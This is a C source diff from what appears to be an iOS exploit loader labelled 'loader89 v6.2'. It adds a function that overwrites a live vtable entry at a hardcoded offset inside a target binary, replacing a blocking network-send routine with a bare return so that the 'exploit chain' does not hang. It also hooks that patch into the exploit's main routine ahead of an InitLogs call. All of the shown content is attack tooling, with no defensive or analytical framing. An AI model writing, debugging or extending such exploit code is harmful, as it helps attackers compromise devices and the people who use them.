@@ -517,6 +517,53 @@ static void repair_core_log_sink(void *core) {
     log_info(msg);
 }
 
+/* v6.2 fix C: neutralize blocking net sink (poll fd,ev,-1 hangs exploit chain; see v62_initlogs_probe.py findings)
+ *
+ * DIFFERENT from repair_core_log_sink (fix A) above: fix A never writes into
+ * the core image - it only READS the vtable pointer at core+0x6ca1b8 and,
+ * when it is ZERO, CALLS the core's own initializer at core+0x59fa28
+ * (see lines "if (*sink) { ... never call 0x59fa28" / "init_sink()" above).
+ * fix C instead OVERWRITES one entry inside an ALREADY-INITIALIZED, non-zero
+ * vtable: the function-pointer slot at core+0x6b6bd8 (sink vtable slot+0x10,
+ * the virtual-send target, factory value core+0x59edd4 = Boost.Asio TCP
+ * client for 127.0.0.1:40001 whose three poll(fd,ev,-1) calls block forever)
+ * gets replaced with core+0x59f3ac (verified bare `ret`). Different offset,
+ * different meaning: fix A creates a missing vtable by calling init;
+ * fix C amputates one live entry of an existing vtable. fix C does not touch
+ * 0x6ca1b8/0x59fa28 and does not change fix A behavior in any way.
+ *
+ * Placement: both the fork-child path (direct exploit_class_main call after
+ * fork) and the in-process thread path (exploit_thread_worker) converge inside
+ * exploit_class_main() right after alloc/init, so the patch is applied there
+ * - whoever reaches InitLogs first patches first. When fork fails only the
+ * thread path runs and still patches there. When the exploit is skipped
+ * entirely (iOS>=17 crash guard / policy=unsupported), InitLogs is never
+ * invoked at all, so there is NO timing gap where InitLogs could run without
+ * the stub in place. */
+static void stub_core_net_sink(void *core) {
+    static int attempted = 0;
+    if (!core) return;
+    if (attempted) return;   /* idempotent: patch at most once per process */
+    attempted = 1;
+    unsigned char *base = 0;
+    if (!resolve_core_base(core, &base)) {
+        log_warn("net sink stub SKIPPED (core base not resolved); continue, not a failure");
+        return;
+    }
+    void **slot = (void **)(base + 0x6b6bd8);
+    void *was = *slot;
+    void *stub = (void *)(base + 0x59f3ac);
+    char msg[220];
+    if (!was) {
+        snprintf(msg, sizeof(msg), "net sink stub NOT applied (slot=%p value NULL, unexpected); continue", (void *)slot);
+        log_warn(msg);
+        return;
+    }
+    *slot = stub;
+    snprintf(msg, sizeof(msg), "net sink stub: slot=%p was=%p -> %p", (void *)slot, was, stub);
+    log_info(msg);
+}
+
 /* v5.8 problem A fix: separate "base resolved" from "raw flag read".
  * return 0 = hard failure (no core handle / no raw==0); never treat
  * a resolver error as exploit success. Detailed state goes to *out_raw /
@@ -674,6 +721,11 @@ static int exploit_class_main(void *acqCls, void *core) {
      * All three take no arguments (v16@0:8). */
     void *inst = p_msgSend(p_msgSend(acqCls, p_sel("alloc")), p_sel("init"));
     if (!inst) { log_error("AcqViewCntrlr_ alloc/init returned nil"); return 3; }
+    /* v6.2 fix C: MUST run before InitLogs. This is the convergence point of
+     * the fork-child path and the thread path (see comment on
+     * stub_core_net_sink); if the exploit is skipped, InitLogs never runs and
+     * there is no timing gap. */
+    stub_core_net_sink(core);
     set_exploit_phase("initlogs");   /* v6.0: phase progress + ts to status file */
     log_info("InitLogs before");
     p_msgSend(inst, p_sel("InitLogs"));
@@ -1106,7 +1158,7 @@ static void *worker(void *arg) {
         log_info(dm);
     }
 
-    log_info("=== loader89 v6.0.1 B-retry-start ===");
+    log_info("=== loader89 v6.2 netsink-stub start ===");
     read_runtime_config();
     {
         /* v5.8 problem C: child/worker exploit state goes to this file;
